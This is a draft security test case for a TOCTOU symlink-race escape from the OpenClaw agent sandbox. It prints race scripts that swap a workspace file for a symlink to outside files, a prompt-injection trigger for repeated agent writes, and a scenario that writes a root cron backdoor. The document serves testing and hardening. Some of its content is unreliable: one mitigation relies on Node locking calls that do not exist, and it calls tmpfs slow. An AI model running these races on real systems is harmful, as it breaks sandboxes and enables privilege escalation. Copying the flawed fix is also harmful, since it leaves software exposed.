---
date: 2026-03-13
category: test-cases
subcategory: sandbox-escape
severity: medium
test_id: TC-SE-005
status: draft
ghsa: GHSA-x82f-27x3-q89c, GHSA-7xmq-g46g-f8pv
---

# Test 5: TOCTOU Symlink Race

## Test Overview

| Item | Content |
|------|---------|
| Test ID | TC-SE-005 |
| Category | Sandbox Escape |
| Attack Technique | Time-of-Check to Time-of-Use (TOCTOU) race condition |
| Severity | Medium (High in attack chains) |
| Difficulty | Advanced |
| GHSA References | [GHSA-x82f](https://github.com/openclaw/openclaw/security/advisories/GHSA-x82f-27x3-q89c), [GHSA-7xmq](https://github.com/openclaw/openclaw/security/advisories/GHSA-7xmq-g46g-f8pv) |
| Fixed In | v2026.3.1 |

## Objective

Verify that OpenClaw properly prevents TOCTOU race conditions where an attacker replaces a validated path with a symlink between validation and file operation, breaking sandbox boundaries.

## Vulnerability Description

TOCTOU (Time-of-Check to Time-of-Use) is a race condition where the state of a resource changes between validation and use. In sandbox contexts:

**GHSA-x82f: writeFileWithinRoot TOCTOU**
- OpenClaw validates path is within sandbox root
- Between validation and write, attacker replaces path with symlink
- Write operation follows symlink outside sandbox

**GHSA-7xmq: Sandbox media TOCTOU**
- OpenClaw checks media file is within sandbox
- Attacker replaces file with symlink during processing
- Read operation accesses file outside sandbox

**Race Window**:
```
Thread 1 (OpenClaw):                Thread 2 (Attacker):
1. Check: path inside sandbox? ✓
                                     2. Replace: path → symlink to /etc/passwd
3. Use: Write to path ✗
   (Actually writes to /etc/passwd)
```

**Critical Insight**: The race window is typically microseconds, but with sufficient attempts or timing manipulation, exploitation becomes practical.

## Prerequisites

- [ ] OpenClaw v2026.3.0 or earlier (vulnerable)
- [ ] Sandbox enabled (`OPENCLAW_SANDBOX=all`)
- [ ] Ability to execute concurrent operations (multi-threading)
- [ ] File system access for symlink manipulation
- [ ] Root/sudo for target file verification

## Test Steps

### Step 1: Setup Race Environment

```bash
# Enable full sandbox
export OPENCLAW_SANDBOX=all

# Create target file outside sandbox
echo "SECRET_DATA" | sudo tee /tmp/toctou-target.txt
sudo chmod 600 /tmp/toctou-target.txt

# Start OpenClaw
openclaw start

# Monitor file system events
sudo inotifywait -m -r /tmp ~/.openclaw/workspace &
INOTIFY_PID=$!
```

### Step 2: Prepare Race Attack Script

**Attacker script (race-symlink.sh)**:
```bash
#!/bin/bash
# Continuously race between file and symlink

WORKSPACE="$HOME/.openclaw/workspace"
TARGET_FILE="$WORKSPACE/output.txt"
EXPLOIT_TARGET="/tmp/toctou-target.txt"

while true; do
  # Create regular file
  touch "$TARGET_FILE" 2>/dev/null

  # Immediately replace with symlink
  rm -f "$TARGET_FILE" 2>/dev/null
  ln -s "$EXPLOIT_TARGET" "$TARGET_FILE" 2>/dev/null

  # Rapidly cycle
  rm -f "$TARGET_FILE" 2>/dev/null
  mkdir -p "$(dirname "$TARGET_FILE")" 2>/dev/null
done
```

**Make executable**:
```bash
chmod +x race-symlink.sh
./race-symlink.sh &
RACE_PID=$!
```

### Step 3: Trigger File Write Operations

```bash
# In OpenClaw session, repeatedly trigger file writes
for i in {1..1000}; do
  echo "Attempt $i: Write test data to output.txt"
done
```

**Via prompt injection**:
```
User: "Write the following text to output.txt 1000 times: 'EXPLOIT_PAYLOAD'"
```

**Via skill execution**:
```javascript
// Repeatedly call writeFileWithinRoot
for (let i = 0; i < 1000; i++) {
  await writeFileWithinRoot(workspaceRoot, 'output.txt', `Attempt ${i}`);
}
```

### Step 4: Check for Successful Race

```bash
# Stop race script
kill $RACE_PID

# Check if target file was modified
sudo cat /tmp/toctou-target.txt

# Expected (secure): Still contains "SECRET_DATA"
# Vulnerable: Contains "EXPLOIT_PAYLOAD" or "Attempt N"

# Check workspace
cat ~/.openclaw/workspace/output.txt

# Check logs for race warnings
grep -i "race" ~/.openclaw/logs/openclaw.log
grep -i "toctou" ~/.openclaw/logs/openclaw.log
```

### Step 5: Measure Race Success Rate

```bash
# Run automated race test
#!/bin/bash
SUCCESS=0
ATTEMPTS=1000

for i in $(seq 1 $ATTEMPTS); do
  # Reset target
  echo "SECRET_DATA" | sudo tee /tmp/toctou-target.txt > /dev/null

  # Start race
  ./race-symlink.sh &
  RACE_PID=$!

  # Trigger write via OpenClaw
  echo "Test write $i" | openclaw write-file output.txt

  # Stop race
  kill $RACE_PID 2>/dev/null

  # Check if race succeeded
  if sudo grep -q "Test write" /tmp/toctou-target.txt; then
    SUCCESS=$((SUCCESS + 1))
  fi
done

echo "Race success rate: $SUCCESS / $ATTEMPTS"
```

## Expected Results (Secure Behavior)

1. **Atomic operations**: Path validation and file operation are atomic
2. **No symlink following**: `O_NOFOLLOW` flag prevents symlink traversal
3. **Race detection**: Logs show "potential race condition detected"
4. **Zero success rate**: Target file remains unmodified after 1000+ attempts
5. **Error on race**: OpenClaw throws error if path changes during operation

## Failure Criteria (Vulnerable Behavior)

1. **Race succeeds**: `/tmp/toctou-target.txt` is modified
2. **Success rate > 0%**: Even 1 successful race indicates vulnerability
3. **No detection**: No warning logs about race conditions
4. **Silent corruption**: File is modified without error

## Test Results

| Item | Content |
|------|---------|
| Execution Date | - |
| Executor | - |
| OpenClaw Version | - |
| Attempts | - |
| Successful Races | - |
| Success Rate | - % |
| Result | PASS / FAIL |

## Mitigation (If Vulnerable)

### Immediate Actions

1. **Upgrade OpenClaw**: Update to v2026.3.1+ where GHSA-x82f and GHSA-7xmq are fixed
2. **Disable concurrent operations**: Reduce attack window
3. **Monitor for exploitation**: Check for modified files outside sandbox

### Long-Term Fixes

**Fix 1: Atomic file operations (openat + fstatat)**
```c
// Use file descriptor-based operations
int dirfd = open(workspace_root, O_RDONLY | O_DIRECTORY);
int fd = openat(dirfd, filename, O_CREAT | O_WRONLY | O_NOFOLLOW | O_EXCL, 0644);

// Verify file is still what we expect
struct stat st;
fstatat(dirfd, filename, &st, AT_SYMLINK_NOFOLLOW);

// Write to file descriptor (not path)
write(fd, data, len);
close(fd);
close(dirfd);
```

**Fix 2: Temporary file + atomic rename**
```javascript
// Write to temporary file first
const tmpPath = `${targetPath}.tmp.${crypto.randomUUID()}`;
fs.writeFileSync(tmpPath, data);

// Atomically rename (no TOCTOU window)
fs.renameSync(tmpPath, targetPath);
```

**Fix 3: Directory file descriptor locking**
```javascript
const fs = require('fs');
const path = require('path');

function safeWriteFileWithinRoot(rootPath, filePath, data) {
  // Open root directory for locking
  const rootFd = fs.openSync(rootPath, fs.constants.O_RDONLY | fs.constants.O_DIRECTORY);

  try {
    // Lock directory (prevents symlink swaps)
    fs.flockSync(rootFd, fs.constants.LOCK_EX);

    // Resolve and validate path
    const absolutePath = path.resolve(rootPath, filePath);
    if (!absolutePath.startsWith(rootPath)) {
      throw new Error('Path traversal detected');
    }

    // Check not a symlink
    const stats = fs.lstatSync(absolutePath);
    if (stats.isSymbolicLink()) {
      throw new Error('Symlink not allowed');
    }

    // Write file
    fs.writeFileSync(absolutePath, data);

  } finally {
    // Unlock and close
    fs.flockSync(rootFd, fs.constants.LOCK_UN);
    fs.closeSync(rootFd);
  }
}
```

## TOCTOU Attack Patterns

### Pattern 1: Simple Race
```bash
while true; do
  rm file; ln -s /etc/passwd file
  rm file; touch file
done
```

### Pattern 2: Timing-Optimized Race
```bash
# Measure typical validation time
# Insert symlink at exact moment

strace -T -e openat,fstatat openclaw-process &
# Analyze timing → inject symlink at T + δ
```

### Pattern 3: Directory Race
```bash
# Race entire directory
while true; do
  rm -rf dir
  mkdir dir

  rm -rf dir
  ln -s /etc dir
done
```

## Relationship to Static Symlink Attacks

| Attack Type | Detection | Exploitation | Fix |
|-------------|-----------|--------------|-----|
| Static symlink | Easy (lstat) | 100% success | O_NOFOLLOW |
| TOCTOU race | Hard (race condition) | 0.1-10% success | Atomic ops |
| Combined | Very hard | Higher success | Both fixes |

## Related Tests

- **Test 1**: Dangling Symlink Bypass — Static symlink variant
- **Test 6**: ZIP Extraction Race — TOCTOU during archive extraction
- **Test 9**: Tmpdir Escape — Using /tmp for race attacks

## References

- [GHSA-x82f-27x3-q89c](https://github.com/openclaw/openclaw/security/advisories/GHSA-x82f-27x3-q89c) — writeFileWithinRoot TOCTOU
- [GHSA-7xmq-g46g-f8pv](https://github.com/openclaw/openclaw/security/advisories/GHSA-7xmq-g46g-f8pv) — Sandbox media TOCTOU
- [CWE-367: Time-of-check Time-of-use Race Condition](https://cwe.mitre.org/data/definitions/367.html)
- [TOCTOU Sandbox Bypass Research](../../knowledge/vulnerabilities/sandbox-escape/2026-03-12-toctou-sandbox-bypass.md)

## Attack Scenario

**Real-world exploitation**:

```
1. Attacker uses prompt injection to trigger file writes
   ↓
2. Simultaneously runs race script (via cron or background process)
   ↓
3. After 100-1000 attempts, race succeeds
   ↓
4. Writes to /etc/cron.d/backdoor via symlink
   ↓
5. Cron executes backdoor with root privileges
```

**Success factors**:
- High-frequency writes increase success probability
- Slower file systems (NFS, network drives) widen race window
- CPU-loaded systems have more scheduling delays
- Multi-core systems allow true parallel racing

## Advanced Techniques

**Timing control**:
```bash
# Use CPU pinning for precise timing
taskset -c 0 ./race-script.sh &
taskset -c 1 openclaw-trigger
```

**Filesystem amplification**:
```bash
# Use slow filesystem to widen window
mount -t tmpfs -o size=1M slowfs /mnt/slow
# Longer write time = wider TOCTOU window
```

## Notes

- TOCTOU attacks have low but non-zero success rates
- Automated testing requires 100-10,000 attempts
- Clean up: `sudo rm /tmp/toctou-target.txt`, `killall race-symlink.sh`
- This is a probabilistic vulnerability — multiple attempts needed
- In practice, combined with other bugs for reliable exploitation
